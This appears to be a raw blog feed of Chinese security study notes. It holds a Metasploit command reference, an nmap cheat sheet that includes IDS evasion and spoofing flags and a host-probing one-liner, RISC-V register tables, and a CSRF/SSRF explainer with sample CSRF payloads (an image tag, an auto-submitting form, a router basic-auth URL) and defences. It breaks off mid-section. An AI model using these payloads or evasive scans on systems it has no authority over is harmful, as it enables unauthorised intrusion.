variable to a valuesetg          # 设置全局变量           Sets a global variable to a valuesleep         # 挂起                   Do nothing for the specified number of secondsspool         # 讲控制台输出输出到文件  Write console output into a file as well the screenthreads       # 查看与操作后台线程      View and manipulate background threadstips          # 显示提示列表           Show a list of useful productivity tipsunload        # 卸载框架插件           Unload a framework pluginunset         # 恢复变量               Unsets one or more context-specific variablesunsetg        # 恢复全局变量           Unsets one or more global variablesversion       # 显示版本               Show the framework and console library version numbers</code></pre><h1 id="Module-Commands"><a href="#Module-Commands" class="headerlink" title="Module Commands"></a>Module Commands</h1><pre><code class="hljs">Command       CN                   Description-------       --                   -----------advanced      # 显示模块高级设置     Displays advanced options for one or more modulesback          # 返回                Move back from the current contextclearm        # 清空模块列表         Clear the module stackfavorite      # 给模块点个赞         Add module(s) to the list of favorite modulesinfo          # 显示模块信息         Displays information about one or more moduleslistm         # 列出模块列表         List the module stackloadpath      # 从路径加载模块       Searches for and loads modules from a pathoptions       # 显示全局设置         Displays global options or for one or more modulespopm          # 从栈取出模块并运行    Pops the latest module off the stack and makes it activeprevious      # 加载上一个模块       Sets the previously loaded module as the current modulepushm         # 模块入栈             Pushes the active or list of modules onto the module stackreload_all    # 从路径重新加载模块    Reloads all modules from all defined module pathssearch        # 搜索模块             Searches module names and descriptionsshow          # 显示模块             Displays modules of a given type, or all modulesuse           # 使用模块             Interact with a module by name or search term/index</code></pre><h1 id="Job-Commands"><a href="#Job-Commands" class="headerlink" title="Job Commands"></a>Job Commands</h1><pre><code class="hljs">Command       CN                 Description-------       -----------        -----------handler       # 启动一个handler   Start a payload handler as jobjobs          # 显示与管理jobs    Displays and manages jobskill          # 结束job          Kill a jobrename_job    # 重命名job        Rename a job</code></pre><h1 id="Resource-Script-Commands"><a href="#Resource-Script-Commands" class="headerlink" title="Resource Script Commands"></a>Resource Script Commands</h1><pre><code class="hljs">Command       CN                      Description-------       --                      -----------makerc        # 将所有命令输出到文件    Save commands entered since start to a fileresource      # 从文件加载命令          Run the commands stored in a file</code></pre><h1 id="Database-Backend-Commands"><a href="#Database-Backend-Commands" class="headerlink" title="Database Backend Commands"></a>Database Backend Commands</h1><pre><code class="hljs">Command           CN                     Description-------           --                     -----------analyze           # 分析数据库信息        Analyze database information about a specific address or address rangedb_connect        # 连接数据库            Connect to an existing data servicedb_disconnect     # 断开数据库            Disconnect from the current data servicedb_export         # 导出包含数据库内容文件 Export a file containing the contents of the databasedb_import         # 导入扫描结果          Import a scan result file (filetype will be auto-detected)db_nmap           # 执行nmap并输出        Executes nmap and records the output automaticallydb_rebuild_cache  # 重建存储模块缓存       Rebuilds the database-stored module cache (deprecated)db_remove         # 删除                 Remove the saved data service entrydb_save           # 设为默认数据库        Save the current data service connection as the default to reconnect on startupdb_status         # 显示数据库状态        Show the current data service statushosts             # 列出数据库中的所有主机 List all hosts in the databaseloot              # 列出数据库中的战利品   List all loot in the databasenotes             # 列出数据库中的笔记     List all notes in the databaseservices          # 列出数据库中的所有服务 List all services in the databasevulns             # 列出数据库中的所有漏洞 List all vulnerabilities in the databaseworkspace         # 切换工作空间          Switch between database workspaces</code></pre><h1 id="Credentials-Backend-Commands"><a href="#Credentials-Backend-Commands" class="headerlink" title="Credentials Backend Commands"></a>Credentials Backend Commands</h1><pre><code class="hljs">Command       CN                         Description-------       --                         -----------creds         # 列出数据库中的所有凭证     List all credentials in the database</code></pre><h1 id="Developer-Commands"><a href="#Developer-Commands" class="headerlink" title="Developer Commands"></a>Developer Commands</h1><pre><code class="hljs">Command       CN                  Description-------       --                  -----------edit          # 编辑当前模块       Edit the current module or a file with the preferred editorirb           # 打开Ruby shell     Open an interactive Ruby shell in the current contextlog           # 显示日志           Display framework.log paged to the end if possiblepry           # 打开Pry debugger   Open the Pry debugger on the current module or Frameworkreload_lib    # 路径加载Ruby库      Reload Ruby library files from specified pathstime          # 命令运行时间        Time how long it takes to run a particular command</code></pre><h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p><code>msfconsole</code> is the primary interface to Metasploit Framework. There is quite a<br>lot that needs go here, please be patient and keep an eye on this space!</p><p>msfconsole是Metasploit Framework的主要界面。这里需要写很多东西，还请耐心等待，关注这个地方！</p><h2 id="Building-ranges-and-lists"><a href="#Building-ranges-and-lists" class="headerlink" title="Building ranges and lists"></a>Building ranges and lists</h2><p>Many commands and options that take a list of things can use ranges to avoid<br>having to manually list each desired thing. All ranges are inclusive.</p><h3 id="Ranges-of-IDs"><a href="#Ranges-of-IDs" class="headerlink" title="Ranges of IDs"></a>Ranges of IDs</h3><p>Commands that take a list of IDs can use ranges to help. Individual IDs must be<br>separated by a <code>,</code> (no space allowed) and ranges can be expressed with either<br><code>-</code> or <code>..</code>.</p><p>需要输入一些编号的命令可以用范围来简化。每个编号之间要用<code>,</code>隔开（不能有空格），范围可以用<code>-</code>或者<code>..</code>来表示。</p><h3 id="Ranges-of-IPs"><a href="#Ranges-of-IPs" class="headerlink" title="Ranges of IPs"></a>Ranges of IPs</h3><p>There are several ways to specify ranges of IP addresses that can be mixed<br>together. The first way is a list of IPs separated by just a <code> </code> (ASCII space),<br>with an optional <code>,</code>. The next way is two complete IP addresses in the form of<br><code>BEGINNING_ADDRESS-END_ADDRESS</code> like <code>127.0.1.44-127.0.2.33</code>. CIDR<br>specifications may also be used, however the whole address must be given to<br>Metasploit like <code>127.0.0.0/8</code> and not <code>127/8</code>, contrary to the RFC.<br>Additionally, a netmask can be used in conjunction with a domain name to<br>dynamically resolve which block to target. All these methods work for both IPv4<br>and IPv6 addresses. IPv4 addresses can also be specified with special octet<br>ranges from the <a href="https://nmap.org/book/man-target-specification.html">NMAP target<br>specification</a></p><p>同样的IP地址也有范围来简化。可以参考nmap。</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p>Terminate the first sessions:</p><pre><code class="hljs">sessions -k 1</code></pre><p>Stop some extra running jobs:</p><pre><code class="hljs">jobs -k 2-6,7,8,11..15</code></pre><p>Check a set of IP addresses:</p><pre><code class="hljs">check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255</code></pre><p>Target a set of IPv6 hosts:</p><pre><code class="hljs">set RHOSTS fe80::3990:0000/110, ::1-::f0f0</code></pre><p>Target a block from a resolved domain name:</p><pre><code class="hljs">set RHOSTS www.example.test/24</code></pre>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nmap</title>
    <link href="/2023/05/01/nmap/"/>
    <url>/2023/05/01/nmap/</url>
    
    <content type="html"><![CDATA[<h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p>Usage: nmap [Scan Type(s)] [Options] {target specification}</p><h4 id="TARGET-SPECIFICATION"><a href="#TARGET-SPECIFICATION" class="headerlink" title="TARGET SPECIFICATION:"></a>TARGET SPECIFICATION:</h4><p>目标规范：</p><pre><code class="hljs">-iL &lt;inputfilename&gt;:                  从文件传入一个list-iR &lt;num hosts&gt;:                        随机选择--exclude &lt;host1[,host2][,host3],...&gt;:   排除host--excludefile &lt;exclude_file&gt;:             从文件排除</code></pre><h4 id="HOST-DISCOVERY"><a href="#HOST-DISCOVERY" class="headerlink" title="HOST DISCOVERY:"></a>HOST DISCOVERY:</h4><p>主机发现：</p><pre><code class="hljs">-sL:                      List Scan ：扫描探测-sn:                       Ping Scan ：不进行端口扫描-Pn:                       跳过主机探测-PS/PA/PU/PY[portlist]:     TCP SYN/ACK, UDP or SCTP 指定端口与协议探测-PE/PP/PM:                   ICMP 回显、时间戳和网络掩码请求探测-PO[protocol list]:           ip协议列表探测-n/-R:                         DNS解析 never/always [默认: sometimes]--dns-servers &lt;serv1[,serv2],...&gt;:   自定义 DNS 服务器--system-dns:                   使用本机DNS--traceroute:                    跟踪每个主机的跃点路径</code></pre><h4 id="SCAN-TECHNIQUES"><a href="#SCAN-TECHNIQUES" class="headerlink" title="SCAN TECHNIQUES:"></a>SCAN TECHNIQUES:</h4><p>扫描技术：</p><pre><code class="hljs">-sS/sT/sA/sW/sM:            TCP SYN/Connect()/ACK/Window size/Maimon(FIN/ACK)-sU:                         UDP 扫描-sN/sF/sX:                   标志位：Null, FIN, 和 Xmas scans(FIN、PSH、URG)--scanflags &lt;flags&gt;:          自定义标志位-sI &lt;zombie host[:probeport]&gt;: Idle scan 空闲扫描^1-sY/sZ:                      SCTP INIT/COOKIE-ECHO scans SCTP协议扫描-sO:                        IP protocol scan 判断目标主机所支持的协议。-b &lt;FTP relay host&gt;:      FTP bounce scan 已弃用</code></pre><p><a href="https://blog.csdn.net/swartz_lubel/article/details/75269466">1. 空闲扫描</a></p><h4 id="PORT-SPECIFICATION-AND-SCAN-ORDER"><a href="#PORT-SPECIFICATION-AND-SCAN-ORDER" class="headerlink" title="PORT SPECIFICATION AND SCAN ORDER:"></a>PORT SPECIFICATION AND SCAN ORDER:</h4><p>端口规范和扫描顺序：</p><pre><code class="hljs">-p &lt;port ranges&gt;:             指定端口--exclude-ports &lt;port ranges&gt;:   排除端口-F:                            快速扫描，100个-r:                          顺序扫描--top-ports &lt;number&gt;:      指定数量常见端口--port-ratio &lt;ratio&gt;:    扫描可能性大于指定ratio的端口，来自nmap统计</code></pre><h4 id="SERVICE-VERSION-DETECTION"><a href="#SERVICE-VERSION-DETECTION" class="headerlink" title="SERVICE/VERSION DETECTION:"></a>SERVICE/VERSION DETECTION:</h4><p>服务/版本探测：</p><pre><code class="hljs">-sV:                         服务版本探测--version-intensity &lt;level&gt;:   探测等级 0-9--version-light:             等级限制，最高为 2--version-all:               最高等级探测 9--version-trace:             显示版本探测信息</code></pre><h4 id="SCRIPT-SCAN"><a href="#SCRIPT-SCAN" class="headerlink" title="SCRIPT SCAN:"></a>SCRIPT SCAN:</h4><p>脚本扫描：</p><pre><code class="hljs">-sC:                               默认脚本扫描：--script=default--script=&lt;Lua scripts&gt;:             `,`分隔脚本列表--script-args=&lt;n1=v1,[n2=v2,...]&gt;:    指定脚本参数--script-args-file=filename:        通过文件提供参数--script-trace:                    显示详情--script-updatedb:                  更新脚本数据库--script-help=&lt;Lua scripts&gt;:         脚本帮助</code></pre><h4 id="OS-DETECTION"><a href="#OS-DETECTION" class="headerlink" title="OS DETECTION:"></a>OS DETECTION:</h4><p>系统探测：</p><pre><code class="hljs">-O:                      操作系统检测--osscan-limit:          探测度限制--osscan-guess:          积极</code></pre><h4 id="TIMING-AND-PERFORMANCE"><a href="#TIMING-AND-PERFORMANCE" class="headerlink" title="TIMING AND PERFORMANCE:"></a>TIMING AND PERFORMANCE:</h4><p>时序与性能：</p><pre><code class="hljs">-T&lt;0-5&gt;: 设置计时模板（越高越快）--min-hostgroup/max-hostgroup &lt;size&gt;:                并发主机扫描组大小--min-parallelism/max-parallelism &lt;numprobes&gt;:              并发运行的探针数量--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;:    指定最小、最大和初始化探针超时值--max-retries &lt;tries&gt;:                                        允许探针重传的最大值--host-timeout &lt;time&gt;:                                    指定单个主机扫描超时时长--scan-delay/--max-scan-delay &lt;time&gt;:                    指定单个主机探针之间延迟控制；--min-rate &lt;number&gt;:                                    指定每秒发送的探针数据包最小速率--max-rate &lt;number&gt;:                                   指定每秒发送的探针数据包最大速率</code></pre><h4 id="FIREWALL-IDS-EVASION-AND-SPOOFING"><a href="#FIREWALL-IDS-EVASION-AND-SPOOFING" class="headerlink" title="FIREWALL/IDS EVASION AND SPOOFING:"></a>FIREWALL/IDS EVASION AND SPOOFING:</h4><p>防火墙/IDS规避与欺骗：</p><pre><code class="hljs">-f; --mtu &lt;val&gt;:                       分段数据包 (optionally w/given MTU)-D &lt;decoy1,decoy2[,ME],...&gt;:           暗渡陈仓-S &lt;IP_Address&gt;:                       源地址伪造-e &lt;iface&gt;:                            指定网口-g/--source-port &lt;portnum&gt;:            指定源端口--proxies &lt;url1,[url2],...&gt;:           指定 HTTP/SOCKS4 代理中继连接--data &lt;hex string&gt;:                   自定义payload到数据包--data-string &lt;string&gt;:                自定义ASCII到数据包--data-length &lt;num&gt;:                   添加随机长度数据到数据包--ip-options &lt;options&gt;:                发送指定 IP 选项数据包--ttl &lt;val&gt;:                           指定ttl--spoof-mac &lt;mac address/prefix/vendor name&gt;: 指定mac地址--badsum:                              伪造校验码</code></pre><h4 id="OUTPUT"><a href="#OUTPUT" class="headerlink" title="OUTPUT:"></a>OUTPUT:</h4><p>输出：</p><pre><code class="hljs">-oN/-oX/-oS/-oG &lt;file&gt;:    输出格式为：Normal, XML, s|&lt;rIpt kIddi3,Grep适用-oA &lt;basename&gt;:            上面的格式同时输出-v:                        显示详细信息 (use -vv or -v2)-d:                        显示调试信息 (use -dd or -d2)--reason:                  显示端口处于特定状态的原因--open:                    仅显示打开（或可能打开）的端口--packet-trace:            显示数据包追踪--iflist:                  打印主机interfaces和路由--append-output:           附加到指定的输出文件--resume &lt;filename&gt;:       恢复中止的扫描--noninteractive:          禁用运行时交互--stylesheet &lt;path/URL&gt;:   XSL 样式表，用于将 XML 输出转换为 HTML--webxml:                  引用 Nmap.Org 中的样式表，以获得更可移植的 XML--no-stylesheet:           防止将 XSL 样式表与 XML 输出关联</code></pre><h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h4><p>杂项：</p><pre><code class="hljs">-6:                        使用IPv6 扫描-A:                        启用操作系统检测、版本检测、脚本扫描和路由跟踪--datadir &lt;dirname&gt;:       指定自定义 Nmap 数据文件位置--send-eth/--send-ip:      使用原始以太网帧或 IP 数据包发送--privileged:              假定用户具有特权--unprivileged:            假设用户缺少原始套接字权限-V:                        版本号-h:                        帮助</code></pre><h4 id="EXAMPLES"><a href="#EXAMPLES" class="headerlink" title="EXAMPLES:"></a>EXAMPLES:</h4><p>例子：</p><pre><code class="hljs">nmap -v -A scanme.nmap.orgnmap -v -sn 192.168.0.0/16 10.0.0.0/8nmap -v -iR 10000 -Pn -p 80</code></pre><p>SEE THE MAN PAGE (<a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a>) FOR MORE OPTIONS AND EXAMPLES</p><h1 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h1><p>从文件中读取域名使用 nmap 探测存活，并输出到另一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat baidu.com.txt | xargs -I &#123;&#125; sh -c <span class="hljs-string">&#x27;nmap -sn &#123;&#125; | grep -B 1 &quot;Host is up&quot; | cut -d &quot; &quot; -f 5 | head -n 1 &gt;&gt; baidu.txt&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V</title>
    <link href="/2023/04/23/RISC-V/"/>
    <url>/2023/04/23/RISC-V/</url>
    
    <content type="html"><![CDATA[<h1 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h1><p>RISC-V 是多个 RV 指令集系列的总称，是一个开源的指令集，它遵循模块化设计理念，核心是一个名为 RV32I 的基础 ISA </p><h1 id="RV32I-寄存器"><a href="#RV32I-寄存器" class="headerlink" title="RV32I 寄存器"></a>RV32I 寄存器</h1><table><thead><tr><th>通用寄存器</th><th>别名</th><th>功能</th><th>维护</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>零寄存器</td><td>N/A</td></tr><tr><td>x1</td><td>ra</td><td>return adress</td><td>Caller</td></tr><tr><td>x2</td><td>sp</td><td>栈指针</td><td>Callee</td></tr><tr><td>x3</td><td>gp</td><td>全局指针</td><td></td></tr><tr><td>x4</td><td>tp</td><td>线程指针</td><td></td></tr><tr><td>x5</td><td>t0</td><td>临时寄存器or替代链接寄存器</td><td>Caller</td></tr><tr><td>x6-x7</td><td>t1-t2</td><td>临时寄存器</td><td>Caller</td></tr><tr><td>x8</td><td>s0/fp</td><td>保存寄存器</td><td>Callee</td></tr><tr><td>x9</td><td>s1</td><td>保存寄存器</td><td>Callee</td></tr><tr><td>x10-x11</td><td>a0-a1</td><td>函数参数or返回值</td><td>Caller</td></tr><tr><td>x12-17</td><td>a2-a7</td><td>函数参数</td><td>Caller</td></tr><tr><td>x18-x27</td><td>s2-s11</td><td>保存寄存器</td><td>Callee</td></tr><tr><td>x28-x31</td><td>t3-t6</td><td>临时寄存器</td><td></td></tr></tbody></table><h1 id="控制状态寄存器CSR"><a href="#控制状态寄存器CSR" class="headerlink" title="控制状态寄存器CSR"></a>控制状态寄存器CSR</h1><table><thead><tr><th>通用寄存器</th><th>访问属性</th><th>功能</th><th></th></tr></thead><tbody><tr><td>mvendorid</td><td>R</td><td>厂商ID</td><td></td></tr><tr><td>marchId</td><td>R</td><td>体系结构id</td><td></td></tr><tr><td>mimpid</td><td>R</td><td>特点实现id</td><td></td></tr><tr><td>mhartid</td><td>R</td><td>hart(硬件线程) id</td><td></td></tr><tr><td>misa</td><td>R</td><td>指令集架构信息</td><td></td></tr><tr><td>mcycle/mycycleh</td><td>R</td><td>时钟周期计数器</td><td></td></tr><tr><td>cycle/ycycleh</td><td>R</td><td>时钟周期计数器</td><td></td></tr><tr><td>minstret</td><td>R</td><td>退休指令计数器</td><td></td></tr><tr><td>mstatus</td><td>RW</td><td>状态控制</td><td></td></tr><tr><td>mie</td><td>RW</td><td>中断使能</td><td></td></tr><tr><td>mip</td><td>R</td><td>当前中断pengding位</td><td></td></tr><tr><td>mtvec</td><td>RW</td><td>中断/异常矢量</td><td></td></tr><tr><td>mtval</td><td>RW</td><td>异常和中断的补充信息（如异常指令，非法地址）</td><td></td></tr><tr><td>mscratch</td><td>RW</td><td>提供一个上下文保存寄存器</td><td></td></tr><tr><td>mepc</td><td>RW</td><td>异常程序指针</td><td></td></tr><tr><td>mcause</td><td>R</td><td>异常/中断原因</td><td></td></tr></tbody></table><h1 id="RV32I-基础指令-47"><a href="#RV32I-基础指令-47" class="headerlink" title="RV32I 基础指令(47)"></a>RV32I 基础指令(47)</h1><h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><p>RISC-V ISA 是变长指令结构，但 RV32I 指令是固定长度，一条指令为32个bit，也就是4个字节，有6种指令格式：</p><ul><li> R 类型指令：用于寄存器-寄存器操作</li><li> I 类型指令：用于短立即数和访存 load 操作</li><li> S 类型指令：用于访存 store 操作</li><li> B 类型指令：用于条件跳转操作</li><li> U 类型指令：用于长立即数</li><li> J 类型指令：用于无条件跳转</li></ul><p><img src="/img/RISC-V/isa6.jpg" alt="RV32I的6种指令格式"></p><h2 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h2><p><img src="/img/RISC-V/rv32iisa.jpg" alt="RV32I的指令"></p>]]></content>
    
    
    <categories>
      
      <category>杂学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF与SSRF</title>
    <link href="/2023/04/03/CSRF%E4%B8%8ESSRF/"/>
    <url>/2023/04/03/CSRF%E4%B8%8ESSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="何为CSRF"><a href="#何为CSRF" class="headerlink" title="何为CSRF"></a>何为CSRF</h1><p>CSRF (Cross-Site Request Forgery) 即跨站请求伪造，CSRF利用的是对用户浏览器的信任，如果用户登陆了一个网站浏览器就会保存用户的cookie，以后对该域的的每一个请求都会携带用户凭证（cookie），这时攻击者发送了某个操作的链接给用户，用户点击之后，就会携带自己的cookie发起请求，完成相应的操作。</p><h2 id="CSRF的分类-1"><a href="#CSRF的分类-1" class="headerlink" title="CSRF的分类[1]"></a>CSRF的分类<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.jianshu.com/p/7f33f9c7997b">[1]</span></a></sup></h2><h3 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h3><p>对应的csrf是通过get请求产生的，例如通过img标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://csrf.xxx.com/admin.php?xx=xx&amp;aa=aa&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>当用户访问包含csrf链接的图片的页面时，就会产生get型csrf。</p><h3 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h3><p>对应的csrf是通过post请求产生的，通常是利用表单提交：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://csrf.xxx.com/admin.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">POST</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xx&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;xx&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当用户访问包含csrf的表单的页面时，就会产生post型csrf。</p><h3 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h3><p>对应的csrf是通过点击链接产生的，通常是利用a标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://csrf.xxx.com/admin.php?xx=xx&amp;aa=aa&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>是兄弟就来砍我！<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当用户点击链接想去砍兄弟时，就会产生链接型csrf。</p><h3 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h3><p>过基础认证的csrf,通常用于路由器：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://admin:admin@192.168.1.1&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>加载图片后，路由器会给用户一个合法的session。</p><h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><h3 id="验证-Referer"><a href="#验证-Referer" class="headerlink" title="验证 Referer"></a>验证 Referer</h3><p>referer 记录了http请求的来源地址，因为csrf攻击一般都是通过跨域发起的请求，所有验证referer是否来自本域或者上一级页面能够有效防止部分csrf，但因为referer是依赖第三方来保障的（例如浏览器），所以此方法并不算安全。</p><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>从csrf的实现原理来看，是因为攻击者能够构造用户的请求，所以可以在http请求里以参数的形式加入一个随机的token，并在服务器建立一个拦截器验证这个token，相对于referer，token要更加安全一些。但是token的安全也是难以保证万无一失的，在一些支持用户自己发表内容的网站上，如果攻击者把个人网站发布在上面，当用户点击之后也可能携带自己的token去访问，这样攻击者就可以得到这个token。如果在添加token功能处添加判断，当通向他域的时候不添加token，攻击者也可以通过referer拿到这个token值。所以添加token的方法也并不完美。</p><h3 id="http头自定义属性"><a href="#http头自定义属性" class="headerlink" title="http头自定义属性"></a>http头自定义属性</h3><p>这种形式是通过把token放置到http头自定义属性里，通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不便，同时，通过XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。然而这种方法的局限性非常大。XMLHttpRequest请求通常用于Ajax方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行CSRF防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为XMLHttpRequest请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><h3 id="使用严格的-SameSite"><a href="#使用严格的-SameSite" class="headerlink" title="使用严格的 SameSite"></a>使用严格的 SameSite</h3><p>Cookie 有一个 SameSite 属性，设置为严格模式（非 none 值），可以让其他网站的中跨域请求不带上 Cookie。</p><h3 id="人机校验"><a href="#人机校验" class="headerlink" title="人机校验"></a>人机校验</h3><p>加一个短信校验、邮箱校验、验证码什么的，确保是一个人在尝试发这个请求。缺点是用户体验不太好。</p><h3 id="双重Cookie验证"><a href="#双重Cookie验证" class="headerlink" title="双重Cookie验证"></a>双重Cookie验证</h3><p>利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。<br>优点是可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。<br>缺点是任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），而且如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。</p><h1 id="何为SSRF"><a href="#何为SSRF" class="headerlink" title="何为SSRF"></a>何为SSRF</h1><p>SSRF (Server-Side Request Forgery) 即服务端请求伪造，SSRF利用的是对服务器的信任，服务器使用用户输入的URL进行资源请求时，未对该URL进行安全校验，通过伪造一个服务端请求发起攻击，攻击者借由服务端为跳板来攻击目标系统。</p><h2 id="SSRF-发生的地点"><a href="#SSRF-发生的地点" class="headerlink" title="SSRF 发生的地点"></a>SSRF 发生的地点</h2><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><h2 id="SSRF-危险函数"><a href="#SSRF-危险函数" class="headerlink" title="SSRF 危险函数"></a>SSRF 危险函数</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//把 **传入的参数(变量)**写入字符串,传参是内网文件的时候，会先去吧这个文件的内容读出来再写入</span><br><span class="hljs-function"><span class="hljs-title">fsockopen</span><span class="hljs-params">(<span class="hljs-variable">$hostname</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$errno</span>,<span class="hljs-variable">$errstr</span>,<span class="hljs-variable">$timeout</span>)</span></span> <span class="hljs-comment">//打开一个网络连接或者一个Unix套接字连接,返回一个文件句柄，fgets()，fgetss()，fwrite()，fclose()还有feof()调用</span><br><span class="hljs-function"><span class="hljs-title">curl_exec</span><span class="hljs-params">()</span></span> <span class="hljs-comment">//函数初始化一个新的会话，返回一个 cURL 句柄,curl_setopt()，curl_exec()和curl_close()调用，可使用伪协议</span><br><span class="hljs-function"><span class="hljs-title">soapClient</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h2 id="SSRF-伪协议"><a href="#SSRF-伪协议" class="headerlink" title="SSRF 伪协议"></a>SSRF 伪协议</h2><ol><li>file协议： 只能读取当前被攻击机的文件，内网机器文件不能读取</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>SFTP协议</li><li>TFTP协议</li><li>LDAP协议</li></ol><h2 id="SSRF的防御与绕过"><a href="#SSRF的防御与绕过" class="headerlink" title="SSRF的防御与绕过"></a>SSRF的防御与绕过</h2><p>防御：</p><ul><li>限制域名： 